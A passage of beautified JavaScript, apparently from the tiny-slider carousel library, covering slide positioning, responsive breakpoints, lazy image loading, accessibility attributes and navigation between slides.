                    for (var a in tnsList.forEach((function (item, i) {
                        var el = "container" === item ? outerWrapper : options[item];
                        if ("object" == typeof el && el) {
                            var prevEl = !!el.previousElementSibling && el.previousElementSibling,
                                parentEl = el.parentNode;
                            el.outerHTML = htmlList[i], options[item] = prevEl ? prevEl.nextElementSibling : parentEl.firstElementChild
                        }
                    })), tnsList = animateIn = animateOut = animateDelay = animateNormal = horizontal = outerWrapper = innerWrapper = container = containerParent = containerHTML = slideItems = slideCount = breakpointZone = windowWidth = autoWidth = fixedWidth = edgePadding = gutter = viewport = items = slideBy = viewportMax = arrowKeys = speed = rewind = loop = autoHeight = sheet = lazyload = slidePositions = slideItemsOut = cloneCount = slideCountNew = hasRightDeadZone = rightBoundary = updateIndexBeforeTransform = transformAttr = transformPrefix = transformPostfix = getIndexMax = index = indexCached = indexMin = indexMax = swipeAngle = moveDirectionExpected = running = onInit = events = newContainerClasses = slideId = disable = disabled = freezable = freeze = frozen = controlsEvents = navEvents = hoverEvents = visibilityEvent = docmentKeydownEvent = touchEvents = dragEvents = hasControls = hasNav = navAsThumbnails = hasAutoplay = hasTouch = hasMouseDrag = slideActiveClass = imgCompleteClass = imgEvents = imgsComplete = controls = controlsText = controlsContainer = controlsContainerHTML = prevButton = nextButton = prevIsButton = nextIsButton = nav = navContainer = navContainerHTML = navItems = pages = pagesCached = navClicked = navCurrentIndex = navCurrentIndexCached = navActiveClass = navStr = navStrCurrent = autoplay = autoplayTimeout = autoplayDirection = autoplayText = autoplayHoverPause = autoplayButton = autoplayButtonHTML = autoplayResetOnVisibility = autoplayHtmlStrings = autoplayTimer = animating = autoplayHoverPaused = autoplayUserPaused = autoplayVisibilityPaused = initPosition = lastPosition = translateInit = panStart = rafIndex = getDist = touch = mouseDrag = null, this) "rebuild" !== a && (this[a] = null);
                    isOn = !1
                },
                rebuild: function () {
                    return tns(extend(options, optionsElements))
                }
            }
        }

        function resetVariblesWhenDisable(condition) {
            condition && (controls = nav = touch = mouseDrag = arrowKeys = autoplay = autoplayHoverPause = autoplayResetOnVisibility = !1)
        }

        function getCurrentSlide() {
            for (var tem = carousel ? index - cloneCount : index; tem < 0;) tem += slideCount;
            return tem % slideCount + 1
        }

        function getStartIndex(ind) {
            return ind = ind ? Math.max(0, Math.min(loop ? slideCount - 1 : slideCount - items, ind)) : 0, carousel ? ind + cloneCount : ind
        }

        function getAbsIndex(i) {
            for (null == i && (i = index), carousel && (i -= cloneCount); i < 0;) i += slideCount;
            return Math.floor(i % slideCount)
        }

        function getCurrentNavIndex() {
            var result, absIndex = getAbsIndex();
            return result = navAsThumbnails ? absIndex : fixedWidth || autoWidth ? Math.ceil((absIndex + 1) * pages / slideCount - 1) : Math.floor(absIndex / items), !loop && carousel && index === indexMax && (result = pages - 1), result
        }

        function getWindowWidth() {
            return win.innerWidth || doc.documentElement.clientWidth || doc.body.clientWidth
        }

        function getInsertPosition(pos) {
            return "top" === pos ? "afterbegin" : "beforeend"
        }

        function getClientWidth(el) {
            if (null != el) {
                var rect, width, div = doc.createElement("div");
                return el.appendChild(div), width = (rect = div.getBoundingClientRect()).right - rect.left, div.remove(), width || getClientWidth(el.parentNode)
            }
        }

        function getViewportWidth() {
            var gap = edgePadding ? 2 * edgePadding - gutter : 0;
            return getClientWidth(containerParent) - gap
        }

        function hasOption(item) {
            if (options[item]) return !0;
            if (responsive) for (var bp in responsive) if (responsive[bp][item]) return !0;
            return !1
        }

        function getOption(item, ww) {
            if (null == ww && (ww = windowWidth), "items" === item && fixedWidth) return Math.floor((viewport + gutter) / (fixedWidth + gutter)) || 1;
            var result = options[item];
            if (responsive) for (var bp in responsive) ww >= parseInt(bp) && item in responsive[bp] && (result = responsive[bp][item]);
            return "slideBy" === item && "page" === result && (result = getOption("items")), carousel || "slideBy" !== item && "items" !== item || (result = Math.floor(result)), result
        }

        function getInnerWrapperStyles(edgePaddingTem, gutterTem, fixedWidthTem, speedTem, autoHeightBP) {
            var str = "";
            if (void 0 !== edgePaddingTem) {
                var gap = edgePaddingTem;
                gutterTem && (gap -= gutterTem), str = horizontal ? "margin: 0 " + gap + "px 0 " + edgePaddingTem + "px;" : "margin: " + edgePaddingTem + "px 0 " + gap + "px 0;"
            } else if (gutterTem && !fixedWidthTem) {
                var gutterTemUnit = "-" + gutterTem + "px";
                str = "margin: 0 " + (horizontal ? gutterTemUnit + " 0 0" : "0 " + gutterTemUnit + " 0") + ";"
            }
            return !carousel && autoHeightBP && TRANSITIONDURATION && speedTem && (str += getTransitionDurationStyle(speedTem)), str
        }

        function getContainerWidth(fixedWidthTem, gutterTem, itemsTem) {
            return fixedWidthTem ? (fixedWidthTem + gutterTem) * slideCountNew + "px" : CALC ? CALC + "(" + 100 * slideCountNew + "% / " + itemsTem + ")" : 100 * slideCountNew / itemsTem + "%"
        }

        function getSlideWidthStyle(fixedWidthTem, gutterTem, itemsTem) {
            var width;
            if (fixedWidthTem) width = fixedWidthTem + gutterTem + "px"; else {
                carousel || (itemsTem = Math.floor(itemsTem));
                var dividend = carousel ? slideCountNew : itemsTem;
                width = CALC ? CALC + "(100% / " + dividend + ")" : 100 / dividend + "%"
            }
            return width = "width:" + width, "inner" !== nested ? width + ";" : width + " !important;"
        }

        function getSlideGutterStyle(gutterTem) {
            var str = "";
            !1 !== gutterTem && (str = (horizontal ? "padding-" : "margin-") + (horizontal ? "right" : "bottom") + ": " + gutterTem + "px;");
            return str
        }

        function getCSSPrefix(name, num) {
            var prefix = name.substring(0, name.length - num).toLowerCase();
            return prefix && (prefix = "-" + prefix + "-"), prefix
        }

        function getTransitionDurationStyle(speed) {
            return getCSSPrefix(TRANSITIONDURATION, 18) + "transition-duration:" + speed / 1e3 + "s;"
        }

        function getAnimationDurationStyle(speed) {
            return getCSSPrefix(ANIMATIONDURATION, 17) + "animation-duration:" + speed / 1e3 + "s;"
        }

        function initSliderTransform() {
            if (hasOption("autoHeight") || autoWidth || !horizontal) {
                var imgs = container.querySelectorAll("img");
                forEach(imgs, (function (img) {
                    var src = img.src;
                    lazyload || (src && src.indexOf("data:image") < 0 ? (img.src = "", addEvents(img, imgEvents), addClass(img, "loading"), img.src = src) : imgLoaded(img))
                })), raf((function () {
                    imgsLoadedCheck(arrayFromNodeList(imgs), (function () {
                        imgsComplete = !0
                    }))
                })), hasOption("autoHeight") && (imgs = getImageArray(index, Math.min(index + items - 1, slideCountNew - 1))), lazyload ? initSliderTransformStyleCheck() : raf((function () {
                    imgsLoadedCheck(arrayFromNodeList(imgs), initSliderTransformStyleCheck)
                }))
            } else carousel && doContainerTransformSilent(), initTools(), initEvents()
        }

        function initSliderTransformStyleCheck() {
            if (autoWidth && slideCount > 1) {
                var num = loop ? index : slideCount - 1;
                !function stylesApplicationCheck() {
                    var left = slideItems[num].getBoundingClientRect().left,
                        right = slideItems[num - 1].getBoundingClientRect().right;
                    Math.abs(left - right) <= 1 ? initSliderTransformCore() : setTimeout((function () {
                        stylesApplicationCheck()
                    }), 16)
                }()
            } else initSliderTransformCore()
        }

        function initSliderTransformCore() {
            horizontal && !autoWidth || (setSlidePositions(), autoWidth ? (rightBoundary = getRightBoundary(), freezable && (freeze = getFreeze()), indexMax = getIndexMax(), resetVariblesWhenDisable(disable || freeze)) : updateContentWrapperHeight()), carousel && doContainerTransformSilent(), initTools(), initEvents()
        }

        function initTools() {
            if (updateSlideStatus(), outerWrapper.insertAdjacentHTML("afterbegin", '<div class="tns-liveregion tns-visually-hidden" aria-live="polite" aria-atomic="true">slide <span class="current">' + getLiveRegionStr() + "</span>  of " + slideCount + "</div>"), liveregionCurrent = outerWrapper.querySelector(".tns-liveregion .current"), hasAutoplay) {
                var txt = autoplay ? "stop" : "start";
                autoplayButton ? setAttrs(autoplayButton, {"data-action": txt}) : options.autoplayButtonOutput && (outerWrapper.insertAdjacentHTML(getInsertPosition(options.autoplayPosition), '<button type="button" data-action="' + txt + '">' + autoplayHtmlStrings[0] + txt + autoplayHtmlStrings[1] + autoplayText[0] + "</button>"), autoplayButton = outerWrapper.querySelector("[data-action]")), autoplayButton && addEvents(autoplayButton, {click: toggleAutoplay}), autoplay && (startAutoplay(), autoplayHoverPause && addEvents(container, hoverEvents), autoplayResetOnVisibility && addEvents(container, visibilityEvent))
            }
            if (hasNav) {
                if (navContainer) setAttrs(navContainer, {"aria-label": "Carousel Pagination"}), forEach(navItems = navContainer.children, (function (item, i) {
                    setAttrs(item, {
                        "data-nav": i,
                        tabindex: "-1",
                        "aria-label": navStr + (i + 1),
                        "aria-controls": slideId
                    })
                })); else {
                    for (var navHtml = "", hiddenStr = navAsThumbnails ? "" : 'style="display:none"', i = 0; i < slideCount; i++) navHtml += '<button type="button" data-nav="' + i + '" tabindex="-1" aria-controls="' + slideId + '" ' + hiddenStr + ' aria-label="' + navStr + (i + 1) + '"></button>';
                    navHtml = '<div class="tns-nav" aria-label="Carousel Pagination">' + navHtml + "</div>", outerWrapper.insertAdjacentHTML(getInsertPosition(options.navPosition), navHtml), navContainer = outerWrapper.querySelector(".tns-nav"), navItems = navContainer.children
                }
                if (updateNavVisibility(), TRANSITIONDURATION) {
                    var prefix = TRANSITIONDURATION.substring(0, TRANSITIONDURATION.length - 18).toLowerCase(),
                        str = "transition: all " + speed / 1e3 + "s";
                    prefix && (str = "-" + prefix + "-" + str), addCSSRule(sheet, "[aria-controls^=" + slideId + "-item]", str, getCssRulesLength(sheet))
                }
                setAttrs(navItems[navCurrentIndex], {"aria-label": navStr + (navCurrentIndex + 1) + navStrCurrent}), removeAttrs(navItems[navCurrentIndex], "tabindex"), addClass(navItems[navCurrentIndex], navActiveClass), addEvents(navContainer, navEvents)
            }
            hasControls && (controlsContainer || prevButton && nextButton || (outerWrapper.insertAdjacentHTML(getInsertPosition(options.controlsPosition), '<div class="tns-controls" aria-label="Carousel Navigation" tabindex="0"><button type="button" data-controls="prev" tabindex="-1" aria-controls="' + slideId + '">' + controlsText[0] + '</button><button type="button" data-controls="next" tabindex="-1" aria-controls="' + slideId + '">' + controlsText[1] + "</button></div>"), controlsContainer = outerWrapper.querySelector(".tns-controls")), prevButton && nextButton || (prevButton = controlsContainer.children[0], nextButton = controlsContainer.children[1]), options.controlsContainer && setAttrs(controlsContainer, {
                "aria-label": "Carousel Navigation",
                tabindex: "0"
            }), (options.controlsContainer || options.prevButton && options.nextButton) && setAttrs([prevButton, nextButton], {
                "aria-controls": slideId,
                tabindex: "-1"
            }), (options.controlsContainer || options.prevButton && options.nextButton) && (setAttrs(prevButton, {"data-controls": "prev"}), setAttrs(nextButton, {"data-controls": "next"})), prevIsButton = isButton(prevButton), nextIsButton = isButton(nextButton), updateControlsStatus(), controlsContainer ? addEvents(controlsContainer, controlsEvents) : (addEvents(prevButton, controlsEvents), addEvents(nextButton, controlsEvents))), disableUI()
        }

        function initEvents() {
            if (carousel && TRANSITIONEND) {
                var eve = {};
                eve[TRANSITIONEND] = onTransitionEnd, addEvents(container, eve)
            }
            touch && addEvents(container, touchEvents, options.preventScrollOnTouch), mouseDrag && addEvents(container, dragEvents), arrowKeys && addEvents(doc, docmentKeydownEvent), "inner" === nested ? events.on("outerResized", (function () {
                resizeTasks(), events.emit("innerLoaded", info())
            })) : (responsive || fixedWidth || autoWidth || autoHeight || !horizontal) && addEvents(win, {resize: onResize}), autoHeight && ("outer" === nested ? events.on("innerLoaded", doAutoHeight) : disable || doAutoHeight()), doLazyLoad(), disable ? disableSlider() : freeze && freezeSlider(), events.on("indexChanged", additionalUpdates), "inner" === nested && events.emit("innerLoaded", info()), "function" == typeof onInit && onInit(info()), isOn = !0
        }

        function onResize(e) {
            raf((function () {
                resizeTasks(getEvent(e))
            }))
        }

        function resizeTasks(e) {
            if (isOn) {
                "outer" === nested && events.emit("outerResized", info(e)), windowWidth = getWindowWidth();
                var bpChanged, breakpointZoneTem = breakpointZone, needContainerTransform = !1;
                responsive && (setBreakpointZone(), (bpChanged = breakpointZoneTem !== breakpointZone) && events.emit("newBreakpointStart", info(e)));
                var indChanged, itemsChanged, itemsTem = items, disableTem = disable, freezeTem = freeze,
                    arrowKeysTem = arrowKeys, controlsTem = controls, navTem = nav, touchTem = touch,
                    mouseDragTem = mouseDrag, autoplayTem = autoplay, autoplayHoverPauseTem = autoplayHoverPause,
                    autoplayResetOnVisibilityTem = autoplayResetOnVisibility, indexTem = index;
                if (bpChanged) {
                    var fixedWidthTem = fixedWidth, autoHeightTem = autoHeight, controlsTextTem = controlsText,
                        centerTem = center, autoplayTextTem = autoplayText;
                    if (!CSSMQ) var gutterTem = gutter, edgePaddingTem = edgePadding
                }
                if (arrowKeys = getOption("arrowKeys"), controls = getOption("controls"), nav = getOption("nav"), touch = getOption("touch"), center = getOption("center"), mouseDrag = getOption("mouseDrag"), autoplay = getOption("autoplay"), autoplayHoverPause = getOption("autoplayHoverPause"), autoplayResetOnVisibility = getOption("autoplayResetOnVisibility"), bpChanged && (disable = getOption("disable"), fixedWidth = getOption("fixedWidth"), speed = getOption("speed"), autoHeight = getOption("autoHeight"), controlsText = getOption("controlsText"), autoplayText = getOption("autoplayText"), autoplayTimeout = getOption("autoplayTimeout"), CSSMQ || (edgePadding = getOption("edgePadding"), gutter = getOption("gutter"))), resetVariblesWhenDisable(disable), viewport = getViewportWidth(), horizontal && !autoWidth || disable || (setSlidePositions(), horizontal || (updateContentWrapperHeight(), needContainerTransform = !0)), (fixedWidth || autoWidth) && (rightBoundary = getRightBoundary(), indexMax = getIndexMax()), (bpChanged || fixedWidth) && (items = getOption("items"), slideBy = getOption("slideBy"), (itemsChanged = items !== itemsTem) && (fixedWidth || autoWidth || (indexMax = getIndexMax()), updateIndex())), bpChanged && disable !== disableTem && (disable ? disableSlider() : function enableSlider() {
                    if (!disabled) return;
                    if (sheet.disabled = !1, container.className += newContainerClasses, doContainerTransformSilent(), loop) for (var j = cloneCount; j--;) carousel && showElement(slideItems[j]), showElement(slideItems[slideCountNew - j - 1]);
                    if (!carousel) for (var i = index, l = index + slideCount; i < l; i++) {
                        var item = slideItems[i], classN = i < index + items ? animateIn : animateNormal;
                        item.style.left = 100 * (i - index) / items + "%", addClass(item, classN)
                    }
                    enableUI(), disabled = !1
                }()), freezable && (bpChanged || fixedWidth || autoWidth) && (freeze = getFreeze()) !== freezeTem && (freeze ? (doContainerTransform(getContainerTransformValue(getStartIndex(0))), freezeSlider()) : (!function unfreezeSlider() {
                    if (!frozen) return;
                    edgePadding && CSSMQ && (innerWrapper.style.margin = "");
                    if (cloneCount) for (var str = "tns-transparent", i = cloneCount; i--;) carousel && removeClass(slideItems[i], str), removeClass(slideItems[slideCountNew - i - 1], str);
                    enableUI(), frozen = !1
                }(), needContainerTransform = !0)), resetVariblesWhenDisable(disable || freeze), autoplay || (autoplayHoverPause = autoplayResetOnVisibility = !1), arrowKeys !== arrowKeysTem && (arrowKeys ? addEvents(doc, docmentKeydownEvent) : removeEvents(doc, docmentKeydownEvent)), controls !== controlsTem && (controls ? controlsContainer ? showElement(controlsContainer) : (prevButton && showElement(prevButton), nextButton && showElement(nextButton)) : controlsContainer ? hideElement(controlsContainer) : (prevButton && hideElement(prevButton), nextButton && hideElement(nextButton))), nav !== navTem && (nav ? (showElement(navContainer), updateNavVisibility()) : hideElement(navContainer)), touch !== touchTem && (touch ? addEvents(container, touchEvents, options.preventScrollOnTouch) : removeEvents(container, touchEvents)), mouseDrag !== mouseDragTem && (mouseDrag ? addEvents(container, dragEvents) : removeEvents(container, dragEvents)), autoplay !== autoplayTem && (autoplay ? (autoplayButton && showElement(autoplayButton), animating || autoplayUserPaused || startAutoplay()) : (autoplayButton && hideElement(autoplayButton), animating && stopAutoplay())), autoplayHoverPause !== autoplayHoverPauseTem && (autoplayHoverPause ? addEvents(container, hoverEvents) : removeEvents(container, hoverEvents)), autoplayResetOnVisibility !== autoplayResetOnVisibilityTem && (autoplayResetOnVisibility ? addEvents(doc, visibilityEvent) : removeEvents(doc, visibilityEvent)), bpChanged) {
                    if (fixedWidth === fixedWidthTem && center === centerTem || (needContainerTransform = !0), autoHeight !== autoHeightTem && (autoHeight || (innerWrapper.style.height = "")), controls && controlsText !== controlsTextTem && (prevButton.innerHTML = controlsText[0], nextButton.innerHTML = controlsText[1]), autoplayButton && autoplayText !== autoplayTextTem) {
                        var i = autoplay ? 1 : 0, html = autoplayButton.innerHTML,
                            len = html.length - autoplayTextTem[i].length;
                        html.substring(len) === autoplayTextTem[i] && (autoplayButton.innerHTML = html.substring(0, len) + autoplayText[i])
                    }
                } else center && (fixedWidth || autoWidth) && (needContainerTransform = !0);
                if ((itemsChanged || fixedWidth && !autoWidth) && (pages = getPages(), updateNavVisibility()), (indChanged = index !== indexTem) ? (events.emit("indexChanged", info()), needContainerTransform = !0) : itemsChanged ? indChanged || additionalUpdates() : (fixedWidth || autoWidth) && (doLazyLoad(), updateSlideStatus(), updateLiveRegion()), itemsChanged && !carousel && function updateGallerySlidePositions() {
                    for (var l = index + Math.min(slideCount, items), i = slideCountNew; i--;) {
                        var item = slideItems[i];
                        i >= index && i < l ? (addClass(item, "tns-moving"), item.style.left = 100 * (i - index) / items + "%", addClass(item, animateIn), removeClass(item, animateNormal)) : item.style.left && (item.style.left = "", addClass(item, animateNormal), removeClass(item, animateIn)), removeClass(item, animateOut)
                    }
                    setTimeout((function () {
                        forEach(slideItems, (function (el) {
                            removeClass(el, "tns-moving")
                        }))
                    }), 300)
                }(), !disable && !freeze) {
                    if (bpChanged && !CSSMQ && (edgePadding === edgePaddingTem && gutter === gutterTem || (innerWrapper.style.cssText = getInnerWrapperStyles(edgePadding, gutter, fixedWidth, speed, autoHeight)), horizontal)) {
                        carousel && (container.style.width = getContainerWidth(fixedWidth, gutter, items));
                        var str = getSlideWidthStyle(fixedWidth, gutter, items) + getSlideGutterStyle(gutter);
                        !function removeCSSRule(sheet, index) {
                            "deleteRule" in sheet ? sheet.deleteRule(index) : sheet.removeRule(index)
                        }(sheet, getCssRulesLength(sheet) - 1), addCSSRule(sheet, "#" + slideId + " > .tns-item", str, getCssRulesLength(sheet))
                    }
                    autoHeight && doAutoHeight(), needContainerTransform && (doContainerTransformSilent(), indexCached = index)
                }
                bpChanged && events.emit("newBreakpointEnd", info(e))
            }
        }

        function getFreeze() {
            if (!fixedWidth && !autoWidth) return slideCount <= (center ? items - (items - 1) / 2 : items);
            var width = fixedWidth ? (fixedWidth + gutter) * slideCount : slidePositions[slideCount],
                vp = edgePadding ? viewport + 2 * edgePadding : viewport + gutter;
            return center && (vp -= fixedWidth ? (viewport - fixedWidth) / 2 : (viewport - (slidePositions[index + 1] - slidePositions[index] - gutter)) / 2), width <= vp
        }

        function setBreakpointZone() {
            for (var bp in breakpointZone = 0, responsive) bp = parseInt(bp), windowWidth >= bp && (breakpointZone = bp)
        }

        function disableUI() {
            !autoplay && autoplayButton && hideElement(autoplayButton), !nav && navContainer && hideElement(navContainer), controls || (controlsContainer ? hideElement(controlsContainer) : (prevButton && hideElement(prevButton), nextButton && hideElement(nextButton)))
        }

        function enableUI() {
            autoplay && autoplayButton && showElement(autoplayButton), nav && navContainer && showElement(navContainer), controls && (controlsContainer ? showElement(controlsContainer) : (prevButton && showElement(prevButton), nextButton && showElement(nextButton)))
        }

        function freezeSlider() {
            if (!frozen) {
                if (edgePadding && (innerWrapper.style.margin = "0px"), cloneCount) for (var str = "tns-transparent", i = cloneCount; i--;) carousel && addClass(slideItems[i], str), addClass(slideItems[slideCountNew - i - 1], str);
                disableUI(), frozen = !0
            }
        }

        function disableSlider() {
            if (!disabled) {
                if (sheet.disabled = !0, container.className = container.className.replace(newContainerClasses.substring(1), ""), removeAttrs(container, ["style"]), loop) for (var j = cloneCount; j--;) carousel && hideElement(slideItems[j]), hideElement(slideItems[slideCountNew - j - 1]);
                if (horizontal && carousel || removeAttrs(innerWrapper, ["style"]), !carousel) for (var i = index, l = index + slideCount; i < l; i++) {
                    var item = slideItems[i];
                    removeAttrs(item, ["style"]), removeClass(item, animateIn), removeClass(item, animateNormal)
                }
                disableUI(), disabled = !0
            }
        }

        function updateLiveRegion() {
            var str = getLiveRegionStr();
            liveregionCurrent.innerHTML !== str && (liveregionCurrent.innerHTML = str)
        }

        function getLiveRegionStr() {
            var arr = getVisibleSlideRange(), start = arr[0] + 1, end = arr[1] + 1;
            return start === end ? start + "" : start + " to " + end
        }

        function getVisibleSlideRange(val) {
            null == val && (val = getContainerTransformValue());
            var end, rangestart, rangeend, start = index;
            if (center || edgePadding ? (autoWidth || fixedWidth) && (rangestart = -(parseFloat(val) + edgePadding), rangeend = rangestart + viewport + 2 * edgePadding) : autoWidth && (rangestart = slidePositions[index], rangeend = rangestart + viewport), autoWidth) slidePositions.forEach((function (point, i) {
                i < slideCountNew && ((center || edgePadding) && point <= rangestart + .5 && (start = i), rangeend - point >= .5 && (end = i))
            })); else {
                if (fixedWidth) {
                    var cell = fixedWidth + gutter;
                    center || edgePadding ? (start = Math.floor(rangestart / cell), end = Math.ceil(rangeend / cell - 1)) : end = start + Math.ceil(viewport / cell) - 1
                } else if (center || edgePadding) {
                    var a = items - 1;
                    if (center ? (start -= a / 2, end = index + a / 2) : end = index + a, edgePadding) {
                        var b = edgePadding * items / viewport;
                        start -= b, end += b
                    }
                    start = Math.floor(start), end = Math.ceil(end)
                } else end = start + items - 1;
                start = Math.max(start, 0), end = Math.min(end, slideCountNew - 1)
            }
            return [start, end]
        }

        function doLazyLoad() {
            if (lazyload && !disable) {
                var arg = getVisibleSlideRange();
                arg.push(lazyloadSelector), getImageArray.apply(null, arg).forEach((function (img) {
                    if (!hasClass(img, imgCompleteClass)) {
                        var eve = {};
                        eve[TRANSITIONEND] = function (e) {
                            e.stopPropagation()
                        }, addEvents(img, eve), addEvents(img, imgEvents), img.src = getAttr(img, "data-src");
                        var srcset = getAttr(img, "data-srcset");
                        srcset && (img.srcset = srcset), addClass(img, "loading")
                    }
                }))
            }
        }

        function imgLoaded(img) {
            addClass(img, "loaded"), imgCompleted(img)
        }

        function imgCompleted(img) {
            addClass(img, imgCompleteClass), removeClass(img, "loading"), removeEvents(img, imgEvents)
        }

        function getImageArray(start, end, imgSelector) {
            var imgs = [];
            for (imgSelector || (imgSelector = "img"); start <= end;) forEach(slideItems[start].querySelectorAll(imgSelector), (function (img) {
                imgs.push(img)
            })), start++;
            return imgs
        }

        function doAutoHeight() {
            var imgs = getImageArray.apply(null, getVisibleSlideRange());
            raf((function () {
                imgsLoadedCheck(imgs, updateInnerWrapperHeight)
            }))
        }

        function imgsLoadedCheck(imgs, cb) {
            return imgsComplete ? cb() : (imgs.forEach((function (img, index) {
                !lazyload && img.complete && imgCompleted(img), hasClass(img, imgCompleteClass) && imgs.splice(index, 1)
            })), imgs.length ? void raf((function () {
                imgsLoadedCheck(imgs, cb)
            })) : cb())
        }

        function additionalUpdates() {
            doLazyLoad(), updateSlideStatus(), updateLiveRegion(), updateControlsStatus(), function updateNavStatus() {
                if (nav && (navCurrentIndex = navClicked >= 0 ? navClicked : getCurrentNavIndex(), navClicked = -1, navCurrentIndex !== navCurrentIndexCached)) {
                    var navPrev = navItems[navCurrentIndexCached], navCurrent = navItems[navCurrentIndex];
                    setAttrs(navPrev, {
                        tabindex: "-1",
                        "aria-label": navStr + (navCurrentIndexCached + 1)
                    }), removeClass(navPrev, navActiveClass), setAttrs(navCurrent, {"aria-label": navStr + (navCurrentIndex + 1) + navStrCurrent}), removeAttrs(navCurrent, "tabindex"), addClass(navCurrent, navActiveClass), navCurrentIndexCached = navCurrentIndex
                }
            }()
        }

        function getMaxSlideHeight(slideStart, slideRange) {
            for (var heights = [], i = slideStart, l = Math.min(slideStart + slideRange, slideCountNew); i < l; i++) heights.push(slideItems[i].offsetHeight);
            return Math.max.apply(null, heights)
        }

        function updateInnerWrapperHeight() {
            var maxHeight = autoHeight ? getMaxSlideHeight(index, items) : getMaxSlideHeight(cloneCount, slideCount),
                wp = middleWrapper || innerWrapper;
            wp.style.height !== maxHeight && (wp.style.height = maxHeight + "px")
        }

        function setSlidePositions() {
            slidePositions = [0];
            var attr = horizontal ? "left" : "top", attr2 = horizontal ? "right" : "bottom",
                base = slideItems[0].getBoundingClientRect()[attr];
            forEach(slideItems, (function (item, i) {
                i && slidePositions.push(item.getBoundingClientRect()[attr] - base), i === slideCountNew - 1 && slidePositions.push(item.getBoundingClientRect()[attr2] - base)
            }))
        }

        function updateSlideStatus() {
            var range = getVisibleSlideRange(), start = range[0], end = range[1];
            forEach(slideItems, (function (item, i) {
                i >= start && i <= end ? hasAttr(item, "aria-hidden") && (removeAttrs(item, ["aria-hidden", "tabindex"]), addClass(item, slideActiveClass)) : hasAttr(item, "aria-hidden") || (setAttrs(item, {
                    "aria-hidden": "true",
                    tabindex: "-1"
                }), removeClass(item, slideActiveClass))
            }))
        }

        function getLowerCaseNodeName(el) {
            return el.nodeName.toLowerCase()
        }

        function isButton(el) {
            return "button" === getLowerCaseNodeName(el)
        }

        function isAriaDisabled(el) {
            return "true" === el.getAttribute("aria-disabled")
        }

        function disEnableElement(isButton, el, val) {
            isButton ? el.disabled = val : el.setAttribute("aria-disabled", val.toString())
        }

        function updateControlsStatus() {
            if (controls && !rewind && !loop) {
                var prevDisabled = prevIsButton ? prevButton.disabled : isAriaDisabled(prevButton),
                    nextDisabled = nextIsButton ? nextButton.disabled : isAriaDisabled(nextButton),
                    disablePrev = index <= indexMin, disableNext = !rewind && index >= indexMax;
                disablePrev && !prevDisabled && disEnableElement(prevIsButton, prevButton, !0), !disablePrev && prevDisabled && disEnableElement(prevIsButton, prevButton, !1), disableNext && !nextDisabled && disEnableElement(nextIsButton, nextButton, !0), !disableNext && nextDisabled && disEnableElement(nextIsButton, nextButton, !1)
            }
        }

        function resetDuration(el, str) {
            TRANSITIONDURATION && (el.style[TRANSITIONDURATION] = str)
        }

        function getCenterGap(num) {
            return null == num && (num = index), autoWidth ? (viewport - (edgePadding ? gutter : 0) - (slidePositions[num + 1] - slidePositions[num] - gutter)) / 2 : fixedWidth ? (viewport - fixedWidth) / 2 : (items - 1) / 2
        }

        function getRightBoundary() {
            var result = viewport + (edgePadding ? gutter : 0) - function getSliderWidth() {
                return fixedWidth ? (fixedWidth + gutter) * slideCountNew : slidePositions[slideCountNew]
            }();
            return center && !loop && (result = fixedWidth ? -(fixedWidth + gutter) * (slideCountNew - 1) - getCenterGap() : getCenterGap(slideCountNew - 1) - slidePositions[slideCountNew - 1]), result > 0 && (result = 0), result
        }

        function getContainerTransformValue(num) {
            var val;
            if (null == num && (num = index), horizontal && !autoWidth) if (fixedWidth) val = -(fixedWidth + gutter) * num, center && (val += getCenterGap()); else {
                var denominator = TRANSFORM ? slideCountNew : items;
                center && (num -= getCenterGap()), val = 100 * -num / denominator
            } else val = -slidePositions[num], center && autoWidth && (val += getCenterGap());
            return hasRightDeadZone && (val = Math.max(val, rightBoundary)), val += !horizontal || autoWidth || fixedWidth ? "px" : "%"
        }

        function doContainerTransformSilent(val) {
            resetDuration(container, "0s"), doContainerTransform(val)
        }

        function doContainerTransform(val) {
            null == val && (val = getContainerTransformValue()), container.style[transformAttr] = transformPrefix + val + transformPostfix
        }

        function animateSlide(number, classOut, classIn, isOut) {
            var l = number + items;
            loop || (l = Math.min(l, slideCountNew));
            for (var i = number; i < l; i++) {
                var item = slideItems[i];
                isOut || (item.style.left = 100 * (i - index) / items + "%"), animateDelay && TRANSITIONDELAY && (item.style[TRANSITIONDELAY] = item.style[ANIMATIONDELAY] = animateDelay * (i - number) / 1e3 + "s"), removeClass(item, classOut), addClass(item, classIn), isOut && slideItemsOut.push(item)
            }
        }

        function render(e, sliderMoved) {
            updateIndexBeforeTransform && updateIndex(), (index !== indexCached || sliderMoved) && (events.emit("indexChanged", info()), events.emit("transitionStart", info()), autoHeight && doAutoHeight(), animating && e && ["click", "keydown"].indexOf(e.type) >= 0 && stopAutoplay(), running = !0, transformCore())
        }

        function strTrans(str) {
            return str.toLowerCase().replace(/-/g, "")
        }

        function onTransitionEnd(event) {
            if (carousel || running) {
                if (events.emit("transitionEnd", info(event)), !carousel && slideItemsOut.length > 0) for (var i = 0; i < slideItemsOut.length; i++) {
                    var item = slideItemsOut[i];
                    item.style.left = "", ANIMATIONDELAY && TRANSITIONDELAY && (item.style[ANIMATIONDELAY] = "", item.style[TRANSITIONDELAY] = ""), removeClass(item, animateOut), addClass(item, animateNormal)
                }
                if (!event || !carousel && event.target.parentNode === container || event.target === container && strTrans(event.propertyName) === strTrans(transformAttr)) {
                    if (!updateIndexBeforeTransform) {
                        var indexTem = index;
                        updateIndex(), index !== indexTem && (events.emit("indexChanged", info()), doContainerTransformSilent())
                    }
                    "inner" === nested && events.emit("innerLoaded", info()), running = !1, indexCached = index
                }
            }
        }

        function goTo(targetIndex, e) {
            if (!freeze) if ("prev" === targetIndex) onControlsClick(e, -1); else if ("next" === targetIndex) onControlsClick(e, 1); else {
                if (running) {
                    if (preventActionWhenRunning) return;
                    onTransitionEnd()
                }
                var absIndex = getAbsIndex(), indexGap = 0;
                if ("first" === targetIndex ? indexGap = -absIndex : "last" === targetIndex ? indexGap = carousel ? slideCount - items - absIndex : slideCount - 1 - absIndex : ("number" != typeof targetIndex && (targetIndex = parseInt(targetIndex)), isNaN(targetIndex) || (e || (targetIndex = Math.max(0, Math.min(slideCount - 1, targetIndex))), indexGap = targetIndex - absIndex)), !carousel && indexGap && Math.abs(indexGap) < items) {
                    var factor = indexGap > 0 ? 1 : -1;
                    indexGap += index + indexGap - slideCount >= indexMin ? slideCount * factor : 2 * slideCount * factor * -1
                }
                index += indexGap, carousel && loop && (index < indexMin && (index += slideCount), index > indexMax && (index -= slideCount)), getAbsIndex(index) !== getAbsIndex(indexCached) && render(e)
            }
        }

